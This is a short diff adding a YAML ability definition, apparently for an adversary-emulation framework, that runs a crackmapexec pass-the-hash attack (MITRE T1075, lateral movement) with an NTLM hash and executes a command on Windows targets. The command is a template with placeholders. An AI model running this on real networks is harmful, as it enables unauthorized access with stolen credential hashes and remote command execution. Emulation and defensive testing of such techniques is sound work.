@@ -1,0 +1,14 @@
+---
+
+- id: taclater-1075-AR01-1v00-200121075648
+  name: crackmapexec Pass the Hash
+  description: .       command execute with crackmapexec.  
+  tactic: lateral-movement
+  technique:
+    attack_id: T1075
+    name: Pass the Hash
+  platforms:
+    windows:
+      cmd:
+        command: |
+          crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} 
